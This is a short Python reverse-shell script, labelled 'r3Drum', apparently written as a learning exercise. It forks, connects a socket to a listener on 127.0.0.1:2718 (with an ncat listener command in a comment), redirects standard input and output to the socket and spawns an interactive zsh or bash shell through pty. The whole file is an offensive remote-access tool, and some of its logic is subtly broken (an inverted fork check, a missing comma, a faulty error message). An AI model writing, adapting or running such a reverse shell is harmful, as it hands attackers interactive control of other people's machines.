#!/usr/bin/env python3


# Reverse Shell >> r3Drum 

# set up listener on localhost
# ncat -l -v -p 2718

import socket
import os
import subprocess
import sys


# set local socket IP/Port to coll back to
IP = '127.0.0.1'
PORT = 2718


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.settimeout(5)

    # fork child process
    try:
        pid = os.fork()
        if pid > 0:
            print('[-] Could not fork child process')
            sys.exit(1)
    except OSError as e:
        pid = os.fork()
        print('[-] Fork not valid')
        print(e.errno + ': ' + e.strerror)
        print('[-] Exit script')
        sys.exit(2)

    print(f'[+] Fork success! Now running in child process with pid {os.getpid()}')

    sock.connect((IP, PORT))

    os.dup2(fd=sock.fileno(), fd2=0)
    os.dup2(fd=sock.fileno(), fd2=1)
    os.dup2(fd=sock.fileno(), fd2=2)

    sock.send(b'[+] Spawning shell ...')

    if 'zsh' in os.listdir('/bin/'):
        # subprocess.Popen(['/bin/zsh', '-i'], shell=True)
        # subprocess.call(['tree'])

        try:
            subprocess.call(['python3', '-c' 'import pty; pty.spawn("/bin/zsh")'])
            subprocess.call(['tree'])
        except Exception as e:
            print(f'[-] {e}: Could not upgrade shell')

    else:
        try:
            shell_proc = subprocess.Popen(['/bin/bash', '-i'], shell=True)
            subprocess.call(['tree'])
        except OSError as e:
            print(f'[!] {e.errno}: {e.strerror}')
            sys.exit(2)

sys.exit(0)

# python -c 'import pty; pty.spawn("/bin/bash")'
# python3 -c 'import pty; pty.spawn("/bin/bash")'